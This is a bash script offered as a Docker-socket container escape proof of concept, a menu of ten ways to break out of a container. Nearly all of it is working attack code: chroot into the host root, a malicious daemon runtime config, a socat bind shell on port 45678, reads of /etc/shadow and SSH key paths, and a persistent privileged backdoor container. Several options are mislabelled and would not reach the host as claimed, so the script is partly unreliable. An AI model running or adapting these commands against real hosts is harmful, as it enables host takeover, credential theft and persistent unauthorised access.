#!/bin/bash
# Docker Socket Container Escape PoC - EV
# For educational purposes only
# Use only in authorized testing environments

echo "[*] Docker Socket Container Escape - Enhanced PoC"
echo "[*] Starting vulnerability check..."

# Check if Docker socket exists in the container
if [ ! -S /var/run/docker.sock ]; then
    echo "[-] Docker socket not found. Container may not be vulnerable."
    exit 1
fi

echo "[+] Docker socket found. Container may be vulnerable."

# Check if Docker CLI is available
if ! command -v docker &> /dev/null; then
    echo "[-] Docker CLI not found. Installing minimal Docker client..."
    # This would require internet access from the container
    curl -fsSL https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz | tar -xvz docker/docker
    PATH=$PATH:$(pwd)/docker
fi

# Display menu of escape methods
echo ""
echo "Available escape methods:"
echo "1. Basic privileged container escape (mount host filesystem)"
echo "2. Docker daemon configuration exploit (write to daemon config)"
echo "3. Create container with custom capabilities"
echo "4. Deploy sidecar container with host network"
echo "5. Exploit Docker API to run command on host"
echo "6. Use Docker image build context to access host files"
echo "7. Abuse volume mounts to access sensitive host paths"
echo "8. Deploy container in host PID namespace and inject code"
echo "9. Exploit Docker API to create exec session"
echo "10. Full system compromise (all of the above)"
echo ""
read -p "Select escape method (1-10): " method

case $method in
    1)
        echo "[+] Executing basic privileged container escape..."
        docker run -it --privileged --pid=host --network=host --cap-add=ALL \
            -v /:/hostfs alpine:latest chroot /hostfs /bin/sh -c \
            "echo '[+] Container escape successful. Now running on the host with root privileges.'; \
             echo '[+] Hostname: '\$(hostname); \
             echo '[+] Host files: '\$(ls -la /); \
             echo '[+] This is a PoC - in a real attack scenario, an attacker could maintain persistence.'"
        ;;
    2)
        echo "[+] Executing Docker daemon configuration exploit..."
        # Create a malicious Docker daemon config
        echo '{
  "runtimes": {
    "custom": {
      "path": "/tmp/backdoor.sh",
      "runtimeArgs": []
    }
  }
}' > /tmp/daemon.json
        
        # Create a container that mounts the host's Docker daemon configuration directory
        docker run --rm -v /etc/docker:/host_etc_docker -v /tmp/daemon.json:/tmp/daemon.json \
            alpine:latest sh -c "cp /tmp/daemon.json /host_etc_docker/daemon.json && \
            echo '[+] Malicious daemon config deployed. After daemon restart, custom runtime can be used.'"
        ;;
    3)
        echo "[+] Creating container with custom capabilities..."
        docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
            alpine:latest sh -c "echo '[+] Container with SYS_ADMIN capability created.'; \
            mkdir -p /tmp/host_mount; \
            mount -t proc none /proc; \
            mount --bind / /tmp/host_mount; \
            echo '[+] Host filesystem mounted at /tmp/host_mount'; \
            ls -la /tmp/host_mount"
        ;;
    4)
        echo "[+] Deploying sidecar container with host network..."
        docker run -d --network=host --name network_escape alpine:latest \
            sh -c "apk add --no-cache socat && \
            socat TCP-LISTEN:45678,fork EXEC:'/bin/sh',stderr,pty,setsid,sigint,echo=0 &>/dev/null & \
            echo '[+] Backdoor listener deployed on host network interface port 45678'"
        ;;
    5)
        echo "[+] Exploiting Docker API to run command on host..."
        # Create a script for the host
        echo '#!/bin/sh
echo "[+] This script is running on the host system"
id
hostname
' > /tmp/host_cmd.sh
        chmod +x /tmp/host_cmd.sh
        
        # Run the script via Docker API
        docker run --rm -v /tmp/host_cmd.sh:/host_cmd.sh \
            --entrypoint="/host_cmd.sh" alpine:latest
        ;;
    6)
        echo "[+] Using Docker image build context to access host files..."
        # Create a Dockerfile that copies a host file
        echo 'FROM alpine:latest
COPY /etc/shadow /shadow
CMD cat /shadow && echo "[+] Host shadow file extracted"' > /tmp/Dockerfile
        
        # Build the image using the Docker API
        docker build -t shadow_extract -f /tmp/Dockerfile /
        
        # Run the container to see the extracted file
        docker run --rm shadow_extract
        ;;
    7)
        echo "[+] Abusing volume mounts to access sensitive host paths..."
        docker run --rm -v /:/host_root -v /etc/shadow:/tmp/shadow \
            alpine:latest sh -c "cat /tmp/shadow | head -5 && \
            echo '[+] Extracted sensitive host files'; \
            echo '[+] SSH keys could be accessed via: /host_root/home/*/.ssh/'"
        ;;
    8)
        echo "[+] Deploying container in host PID namespace and injecting code..."
        docker run --rm --pid=host --privileged alpine:latest sh -c \
            "echo '[+] Running in host PID namespace'; \
            ps aux | grep -E 'sshd|dockerd' | head -3; \
            echo '[+] In a real attack, could inject code into host processes'"
        ;;
    9)
        echo "[+] Exploiting Docker API to create exec session..."
        # First create a long-running container
        docker run -d --name exec_container alpine:latest sleep 1d
        
        # Then create an exec session with privileged flag
        docker exec -it --privileged exec_container sh -c \
            "echo '[+] Privileged exec session in container'; \
            mkdir -p /tmp/host && mount --bind / /tmp/host && \
            echo '[+] Host filesystem mounted at /tmp/host:' && \
            ls -la /tmp/host/root"
        
        # Clean up
        docker rm -f exec_container
        ;;
    10)
        echo "[+] Executing full system compromise..."
        # Create a persistent backdoor container
        docker run -d --restart=always --privileged --pid=host --network=host \
            --name persistent_backdoor -v /:/host_root \
            alpine:latest sh -c "echo '[+] Persistent privileged container created'; \
            apk add --no-cache socat openssh; \
            echo '[+] In a real attack scenario, this container would establish persistence, \
            create backdoor accounts, and maintain access to the host system.'; \
            tail -f /dev/null"
        
        echo "[+] Persistent container created. Access it with:"
        echo "    docker exec -it persistent_backdoor sh"
        ;;
    *)
        echo "[-] Invalid option. Exiting."
        exit 1
        ;;
esac

echo "[+] PoC execution completed."
echo "[+] Warning: In a security testing scenario, don't forget to clean up any containers created."
echo "    docker rm -f persistent_backdoor exec_container network_escape 2>/dev/null"
echo "    docker rmi shadow_extract 2>/dev/null"